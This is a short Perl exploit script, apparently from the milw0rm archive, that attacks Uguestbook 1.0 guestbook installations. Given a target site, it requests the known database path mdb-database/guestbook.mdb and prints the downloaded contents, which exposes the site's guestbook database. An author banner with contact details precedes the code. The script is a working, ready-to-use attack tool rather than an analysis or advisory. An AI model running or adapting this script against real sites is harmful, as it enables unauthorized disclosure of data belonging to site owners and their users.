#!/usr/bin/perl
#
#
# Uguestbook 1.0
# mdb-database/guestbook.mdb
#
#
#
#
#
#
#
use LWP::Simple;
use LWP::UserAgent;

print "\tUguestbook 1.0 Arbitrary Database Disclosure Exploit\n";

print "\t****************************************************************\n";
print "\t*      Found And Exploited By : Cyber-Zone (ABDELKHALEK)       *\n";
print "\t*           E-mail : Paradis_des_fous[at]hotmail.fr            *\n";
print "\t*          Home : WwW.IQ-TY.CoM , WwW.No-Exploit.CoM           *\n";
print "\t*               From : MoroccO Figuig/Oujda City               *\n";
print "\t****************************************************************\n\n\n\n";
if(@ARGV < 1)
{
&help; exit();
}
sub help()
{
print "[X] Usage : perl $0 site \n";
print "[X] Exemple : perl $0 www.site.com \n";
}
($site) = @ARGV;
print("Please Wait ! Connecting To The Server ......\n\n");
sleep(5);
$database = "mdb-database/guestbook.mdb";
my $exploit = "http://" . $site . "/" . $database;
print("Searching For file ...\n\n");
sleep(3);
$doexploit=get $exploit;
if($doexploit){
print("..........................File Contents...........................\n");
print("$doexploit\n");
print("..............................EOF.................................\n");
}
else {
help();
exit;
}

# milw0rm.com [2009-05-04]
